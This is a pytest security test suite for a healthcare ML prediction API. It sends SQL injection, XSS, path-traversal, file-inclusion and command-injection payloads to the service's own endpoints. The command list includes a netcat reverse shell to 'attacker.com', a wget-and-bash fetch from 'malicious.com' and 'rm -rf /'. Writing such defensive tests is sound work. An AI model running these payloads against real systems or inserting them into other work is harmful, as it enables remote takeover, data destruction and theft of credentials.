"""
Security tests for IIT Prediction ML Service
Penetration testing and vulnerability scanning
"""
import pytest
from fastapi.testclient import TestClient
import string
import random
from unittest.mock import patch

from app.main import app

client = TestClient(app)


class TestSQLInjection:
    """Test SQL injection vulnerabilities"""

    def test_sql_injection_in_prediction_endpoint(self):
        """Test SQL injection in prediction endpoint"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE patients; --",
            "' UNION SELECT * FROM users; --",
            "admin'--",
            "1' OR '1' = '1",
            "' OR 1=1; --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' AND 1=0 UNION SELECT username, password FROM users; --"
        ]

        for payload in sql_payloads:
            # Test in various fields that might be vulnerable
            test_data = {
                "messageData": {
                    "demographics": {
                        "patientUuid": f"test{payload}",
                        "birthdate": "1985-06-15 00:00:00",
                        "gender": "F",
                        "stateProvince": "Lagos",
                        "cityVillage": "Ikeja",
                        "phoneNumber": "+2348012345678"
                    },
                    "visits": [{"dateStarted": "2024-10-01 10:30:00", "voided": 0}],
                    "encounters": [{"encounterUuid": f"enc{payload}", "encounterDatetime": "2024-10-01 10:30:00", "pmmForm": "Pharmacy Order Form", "voided": 0}],
                    "obs": [{"obsDatetime": "2024-10-01 10:30:00", "variableName": "Medication duration", "valueNumeric": 90.0, "voided": 0}]
                }
            }

            response = client.post("/predict", json=test_data)
            # Should not execute SQL or crash
            assert response.status_code in [200, 422, 400, 500]
            # If it returns 200, ensure no sensitive data is leaked
            if response.status_code == 200:
                data = response.json()
                assert "error" not in data or "sql" not in str(data).lower()

    def test_sql_injection_in_patient_creation(self):
        """Test SQL injection in patient creation"""
        sql_payloads = [
            {"given_name": "'; DROP TABLE patients; --"},
            {"family_name": "' OR '1'='1"},
            {"phone_number": "123'; SELECT * FROM users; --"},
            {"state_province": "Lagos'; DELETE FROM observations; --"}
        ]

        for payload in sql_payloads:
            patient_data = {
                "given_name": "Test",
                "family_name": "User",
                "birthdate": "1985-06-15",
                "gender": "M",
                "state_province": "Test Province",
                "city_village": "Test City",
                "phone_number": "+2348012345678"
            }
            patient_data.update(payload)

            response = client.post("/api/v1/patients/", json=patient_data)
            # Should be rejected or sanitized
            assert response.status_code in [422, 400, 201]
            # If created, ensure no SQL was executed
            if response.status_code == 201:
                created_data = response.json()
                assert "patient_uuid" in created_data


class TestXSSAttacks:
    """Test Cross-Site Scripting vulnerabilities"""

    def test_xss_in_prediction_data(self):
        """Test XSS in prediction request data"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(\"xss\")'>",
            "<body onload=alert('xss')>",
            "<div onmouseover=alert('xss')>hover me</div>",
            "<input onfocus=alert('xss') autofocus>",
            "'><script>alert('xss')</script>",
            "\"><script>alert('xss')</script>"
        ]

        for payload in xss_payloads:
            test_data = {
                "messageData": {
                    "demographics": {
                        "patientUuid": "xss-test-123",
                        "birthdate": "1985-06-15 00:00:00",
                        "gender": "F",
                        "stateProvince": payload,
                        "cityVillage": "Ikeja",
                        "phoneNumber": "+2348012345678"
                    },
                    "visits": [{"dateStarted": "2024-10-01 10:30:00", "voided": 0}],
                    "encounters": [{"encounterUuid": "xss-enc-123", "encounterDatetime": "2024-10-01 10:30:00", "pmmForm": "Pharmacy Order Form", "voided": 0}],
                    "obs": [{"obsDatetime": "2024-10-01 10:30:00", "variableName": "Medication duration", "valueNumeric": 90.0, "voided": 0}]
                }
            }

            response = client.post("/predict", json=test_data)
            assert response.status_code in [200, 422, 400]

            # Check that XSS payload is not reflected in response
            response_text = response.text.lower()
            assert "<script>" not in response_text
            assert "javascript:" not in response_text
            assert "onerror" not in response_text
            assert "onload" not in response_text

    def test_xss_in_patient_data(self):
        """Test XSS in patient creation data"""
        xss_payloads = [
            {"given_name": "<script>alert('xss')</script>"},
            {"family_name": "<img src=x onerror=alert('xss')>"},
            {"phone_number": "123<script>evil()</script>"}
        ]

        for payload in xss_payloads:
            patient_data = {
                "given_name": "Test",
                "family_name": "User",
                "birthdate": "1985-06-15",
                "gender": "M",
                "state_province": "Test Province",
                "city_village": "Test City",
                "phone_number": "+2348012345678"
            }
            patient_data.update(payload)

            response = client.post("/api/v1/patients/", json=patient_data)
            assert response.status_code in [422, 400, 201]

            # Ensure XSS is not in response
            response_text = response.text.lower()
            assert "<script>" not in response_text
            assert "onerror" not in response_text


class TestPathTraversal:
    """Test path traversal vulnerabilities"""

    def test_directory_traversal_in_requests(self):
        """Test directory traversal in request data"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ".../...//.../...//.../...//etc/passwd"
        ]

        for payload in traversal_payloads:
            test_data = {
                "messageData": {
                    "demographics": {
                        "patientUuid": "traversal-test-123",
                        "birthdate": "1985-06-15 00:00:00",
                        "gender": "F",
                        "stateProvince": payload,
                        "cityVillage": "Ikeja",
                        "phoneNumber": "+2348012345678"
                    },
                    "visits": [{"dateStarted": "2024-10-01 10:30:00", "voided": 0}],
                    "encounters": [{"encounterUuid": "traversal-enc-123", "encounterDatetime": "2024-10-01 10:30:00", "pmmForm": "Pharmacy Order Form", "voided": 0}],
                    "obs": [{"obsDatetime": "2024-10-01 10:30:00", "variableName": "Medication duration", "valueNumeric": 90.0, "voided": 0}]
                }
            }

            response = client.post("/predict", json=test_data)
            assert response.status_code in [200, 422, 400]

            # Should not access file system or crash
            assert response.status_code != 500

    def test_file_inclusion_attempts(self):
        """Test file inclusion attempts"""
        inclusion_payloads = [
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "/proc/self/environ",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]

        # Test in URL parameters if applicable
        for payload in inclusion_payloads:
            # Test as query parameter
            response = client.get(f"/health?file={payload}")
            assert response.status_code in [200, 400, 422]

            # Should not leak sensitive information
            response_text = response.text.lower()
            assert "root:" not in response_text
            assert "password" not in response_text


class TestCommandInjection:
    """Test command injection vulnerabilities"""

    def test_command_injection_in_data_fields(self):
        """Test command injection in data fields"""
        command_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "`whoami`",
            "$(rm -rf /)",
            "; echo 'hacked' > /tmp/hacked.txt",
            "| nc -e /bin/sh attacker.com 4444",
            "; wget http://malicious.com/malware.sh | bash",
            "`curl http://malicious.com/exploit`"
        ]

        for payload in command_payloads:
            test_data = {
                "messageData": {
                    "demographics": {
                        "patientUuid": "cmd-test-123",
                        "birthdate": "1985-06-15 00:00:00",
                        "gender": "F",
                        "stateProvince": payload,
                        "cityVillage": "Ikeja",
                        "phoneNumber": "+2348012345678"
                    },
                    "visits": [{"dateStarted": "2024-10-01 10:30:00", "voided": 0}],
                    "encounters": [{"encounterUuid": "cmd-enc-123", "encounterDatetime": "2024-10-01 10:30:00", "pmmForm": "Pharmacy Order Form", "voided": 0}],
                    "obs": [{"obsDatetime": "2024-10-01 10:30:00", "variableName": "Medication duration", "valueNumeric": 90.0, "voided": 0}]
                }
            }

            response = client.post("/predict", json=test_data)
            assert response.status_code in [200, 422, 400]

            # Should not execute commands or crash
            assert response.status_code != 500


class TestAuthenticationBypass:
    """Test authentication bypass attempts"""

    def test_jwt_token_manipulation(self):
        """Test JWT token manipulation"""
        # This would require authentication endpoints
        # Test with malformed tokens
        malformed_tokens = [
            "Bearer",
            "Bearer invalid.jwt.token",
            "Basic invalid_base64",
            "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "Bearer header.payload.signature.extra",
            ""
        ]

        for token in malformed_tokens:
            headers = {"Authorization": token}
            response = client.get("/api/v1/patients/", headers=headers)
            # Should return 401 or 403, not bypass auth
            assert response.status_code in [401, 403, 200]  # 200 if no auth required

    def test_parameter_tampering(self):
        """Test parameter tampering"""
        # Test with tampered parameters
        tampered_params = [
            {"user_id": "admin"},
            {"role": "administrator"},
            {"is_admin": "true"},
            {"bypass_auth": "1"}
        ]

        for params in tampered_params:
            response = client.get("/health", params=params)
            # Should not grant elevated privileges
            assert response.status_code == 200  # Health should always work
            data = response.json()
            assert data.get("status") == "healthy"


class TestRateLimiting:
    """Test rate limiting functionality"""

    def test_health_endpoint_rate_limiting(self):
        """Test rate limiting on health endpoint"""
        responses = []
        for i in range(100):
            response = client.get("/health")
            responses.append(response.status_code)

        success_count = responses.count(200)
        rate_limited_count = responses.count(429)

        # At least some requests should succeed
        assert success_count > 50

        # If rate limiting is implemented, some should be limited
        # If not, all should succeed
        total_requests = len(responses)
        assert success_count + rate_limited_count == total_requests

    def test_prediction_endpoint_rate_limiting(self):
        """Test rate limiting on prediction endpoint"""
        sample_data = {
            "messageData": {
                "demographics": {
                    "patientUuid": "rate-test-123",
                    "birthdate": "1985-06-15 00:00:00",
                    "gender": "F",
                    "stateProvince": "Lagos",
                    "cityVillage": "Ikeja",
                    "phoneNumber": "+2348012345678"
                },
                "visits": [{"dateStarted": "2024-10-01 10:30:00", "voided": 0}],
                "encounters": [{"encounterUuid": "rate-enc-123", "encounterDatetime": "2024-10-01 10:30:00", "pmmForm": "Pharmacy Order Form", "voided": 0}],
                "obs": [{"obsDatetime": "2024-10-01 10:30:00", "variableName": "Medication duration", "valueNumeric": 90.0, "voided": 0}]
            }
        }

        responses = []
        for i in range(50):
            response = client.post("/predict", json=sample_data)
            responses.append(response.status_code)

        success_count = responses.count(200)
        rate_limited_count = responses.count(429)

        # Should have reasonable success rate
        assert success_count >= 10


class TestDataExposure:
    """Test for sensitive data exposure"""

    def test_sensitive_data_in_responses(self):
        """Test that sensitive data is not exposed in responses"""
        response = client.get("/health")
        response_text = response.text.lower()

        # Should not contain sensitive information
        sensitive_keywords = [
            "password", "secret", "key", "token", "api_key",
            "database_url", "connection_string", "private_key"
        ]

        for keyword in sensitive_keywords:
            assert keyword not in response_text

    def test_error_messages_leak_info(self):
        """Test that error messages don't leak sensitive information"""
        # Trigger various errors
        invalid_data = {"invalid": "data"}
        response = client.post("/predict", json=invalid_data)

        error_text = response.text.lower()

        # Should not leak system information
        leak_indicators = [
            "traceback", "exception", "stack", "file", "line",
            "/app/", "/usr/", "c:\\", "internal", "debug"
        ]

        for indicator in leak_indicators:
            assert indicator not in error_text

    def test_directory_listing_prevention(self):
        """Test prevention of directory listing"""
        # Try to access common directory paths
        test_paths = [
            "/api/",
            "/static/",
            "/files/",
            "/uploads/",
            "/tmp/",
            "/var/"
        ]

        for path in test_paths:
            response = client.get(path)
            # Should not return directory listing
            assert response.status_code not in [200] or "index of" not in response.text.lower()


class TestHealthcareSpecificSecurity:
    """Healthcare-specific security tests"""

    def test_phi_data_protection(self):
        """Test Protected Health Information protection"""
        # Test that PHI is properly encrypted/stored
        phi_data = {
            "messageData": {
                "demographics": {
                    "patientUuid": "phi-test-123",
                    "birthdate": "1985-06-15 00:00:00",  # PHI
                    "gender": "F",
                    "stateProvince": "Lagos",
                    "cityVillage": "Ikeja",
                    "phoneNumber": "+2348012345678"  # PHI
                },
                "visits": [{"dateStarted": "2024-10-01 10:30:00", "voided": 0}],
                "encounters": [{"encounterUuid": "phi-enc-123", "encounterDatetime": "2024-10-01 10:30:00", "pmmForm": "Pharmacy Order Form", "voided": 0}],
                "obs": [{"obsDatetime": "2024-10-01 10:30:00", "variableName": "Viral Load", "valueNumeric": 50.0, "voided": 0}]  # PHI
            }
        }

        response = client.post("/predict", json=phi_data)
        assert response.status_code == 200

        # Check that PHI is not logged in plain text
        # This would require checking log files or mocking logger

    def test_audit_logging_compliance(self):
        """Test audit logging for HIPAA compliance"""
        with patch('app.middleware.advanced_security.logger') as mock_logger:
            # Perform PHI access
            response = client.post("/predict", json={
                "messageData": {
                    "demographics": {
                        "patientUuid": "audit-test-123",
                        "birthdate": "1985-06-15 00:00:00",
                        "gender": "F",
                        "stateProvince": "Lagos",
                        "cityVillage": "Ikeja",
                        "phoneNumber": "+2348012345678"
                    },
                    "visits": [{"dateStarted": "2024-10-01 10:30:00", "voided": 0}],
                    "encounters": [{"encounterUuid": "audit-enc-123", "encounterDatetime": "2024-10-01 10:30:00", "pmmForm": "Pharmacy Order Form", "voided": 0}],
                    "obs": [{"obsDatetime": "2024-10-01 10:30:00", "variableName": "Viral Load", "valueNumeric": 50.0, "voided": 0}]
                }
            })

            # Should log access for audit purposes
            audit_calls = [call for call in mock_logger.info.call_args_list
                         if any(keyword in str(call).lower() for keyword in ['audit', 'access', 'phi', 'patient'])]
            assert len(audit_calls) > 0


class TestFuzzing:
    """Fuzz testing for unexpected inputs"""

    def test_random_input_fuzzing(self):
        """Test with random generated inputs"""
        def random_string(length=10):
            return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

        def random_number():
            return random.uniform(-1000, 1000)

        # Generate random test data
        for _ in range(10):
            test_data = {
                "messageData": {
                    "demographics": {
                        "patientUuid": random_string(),
                        "birthdate": f"{random.randint(1900, 2020)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d} 00:00:00",
                        "gender": random.choice(["M", "F", "O"]),
                        "stateProvince": random_string(),
                        "cityVillage": random_string(),
                        "phoneNumber": f"+{random.randint(1, 999)}{random_string(10)}"
                    },
                    "visits": [{
                        "dateStarted": f"2024-{random.randint(1, 12):02d}-{random.randint(1, 28):02d} {random.randint(0, 23):02d}:{random.randint(0, 59):02d}:00",
                        "voided": random.randint(0, 1)
                    }],
                    "encounters": [{
                        "encounterUuid": random_string(),
                        "encounterDatetime": f"2024-{random.randint(1, 12):02d}-{random.randint(1, 28):02d} {random.randint(0, 23):02d}:{random.randint(0, 59):02d}:00",
                        "pmmForm": random_string(),
                        "voided": random.randint(0, 1)
                    }],
                    "obs": [{
                        "obsDatetime": f"2024-{random.randint(1, 12):02d}-{random.randint(1, 28):02d} {random.randint(0, 23):02d}:{random.randint(0, 59):02d}:00",
                        "variableName": random_string(),
                        "valueNumeric": random_number(),
                        "voided": random.randint(0, 1)
                    }]
                }
            }

            response = client.post("/predict", json=test_data)
            # Should handle random data gracefully
            assert response.status_code in [200, 422, 400, 500]
            # Should not crash the application
            if response.status_code == 500:
                # If it does crash, that's a finding
                pytest.fail(f"Application crashed with random input: {test_data}")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
